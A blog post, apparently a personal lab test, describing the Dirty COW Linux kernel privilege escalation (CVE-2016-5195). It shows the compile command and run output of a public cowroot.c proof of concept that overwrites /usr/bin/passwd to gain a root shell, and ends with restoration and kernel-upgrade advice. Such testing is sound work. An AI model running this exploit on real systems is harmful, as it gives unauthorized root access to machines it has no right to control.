Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux
Kernel.
"[A race condition](https://en.wikipedia.org/wiki/Race_condition) was found in
the way the Linux kernel's memory subsystem
handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise
read-only memory mappings and thus increase their privileges on the system."
([Source: Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#))

<!-- PELICAN_END_SUMMARY -->

So globally with the write code doing the right thing a unprivileged user can
get root permission on most GNU/Linux systems.
The satiric web site [dirtycow.ninja/](https://dirtycow.ninja/) was in the first
time create to make fun of people giving name to vulnerability even a [youtube
video](https://www.youtube.com/watch?v=kEsshExn7aE) was made. Nevertheless the
wiki of the website (on github) link to a [few
PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs).

I test one of this PoCs on my test computer. The exploits were not fully stable
at the time an my computer was sometime friezing just after getting root
privileges.

I used a modified version of the cowroot.c PoCs host on [a
gist](https://gist.github.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43).
First of all we compile the exploit code:


    [maggick@computer_name dirtycow]$ gcc cowroot.c -o cowroot -pthread
    cowroot.c: In function ‘procselfmemThread’:
    cowroot.c:107:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [-Wint-conversion]
             lseek(f,map,SEEK_SET);
                     ^~~
    In file included from cowroot.c:27:0:
    /usr/include/unistd.h:337:16: note: expected ‘__off_t {aka long int}’ but argument is of type ‘void *’
     extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                    ^~~~~
    cowroot.c: In function ‘main’:
    cowroot.c:144:5: warning: implicit declaration of function ‘asprintf’ [-Wimplicit-function-declaration]
         asprintf(&backup, "cp %s /tmp/bak", suid_binary);
         ^~~~~~~~
    cowroot.c:148:5: warning: implicit declaration of function ‘fstat’ [-Wimplicit-function-declaration]
         fstat(f,&st);
         ^~~~~

The warning are not really important after the compilation we just launch the
exploit:

    [maggick@computer_name dirtycow]$ ./cowroot
    DirtyCow root privilege escalation
    Backing up /usr/bin/passwd to /tmp/bak
    Size of binary: 47224
    Racing, this may take a while..
    /usr/bin/passwd overwritten
    Popping root shell.
    Don't forget to restore /tmp/bak
    thread stopped
    thread stopped
    [root@computer_name dirtycow]# id
    uid=0(root) gid=1000(maggick) groups=1000(maggick)

And we got root privileges as planned. The exploit replace the
`/usr/bin/passwd` executable so we need to restore it with the one in
`/tmp/bak`.

In order to correct this vulnerability we just need to upgrade our kernel.
